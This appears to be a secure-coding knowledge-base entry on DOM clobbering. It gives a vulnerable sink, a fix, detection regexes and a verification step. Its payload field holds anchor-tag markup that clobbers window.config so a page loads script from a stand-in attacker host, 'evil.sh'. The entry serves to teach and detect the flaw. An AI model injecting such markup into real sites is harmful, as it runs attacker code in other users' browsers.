---
cwe: 79
owasp: A05
title: DOM clobbering
category: content
severity: medium
sink: |-
    script.src = window.config?.cdn || "/app.js"
payload: |-
    <a id="config"></a>
    <a id="config" name="cdn" href="//evil.sh/x.js"></a>
fix: |
    const config = JSON.parse(document.getElementById("config-json").textContent);
detect:
    - 'window\.\w+\?\.'
    - 'window\.\w+ \|\|'
    - 'document\.\w+ \|\|'
verify: 'Post `<a id="config"></a><a id="config" name="cdn" href="//example.com">` where users may write HTML, and watch what the script loads.'
fineWhen: "Your own script sets the global before any user markup is parsed, or the sanitiser runs with `SANITIZE_NAMED_PROPS`."
refs:
    - https://portswigger.net/web-security/dom-based/dom-clobbering
---

Sanitizers let plain anchors through. Two with `id="config"` become `window.config`, `.cdn` picks mine, and its `href` becomes your script's URL.
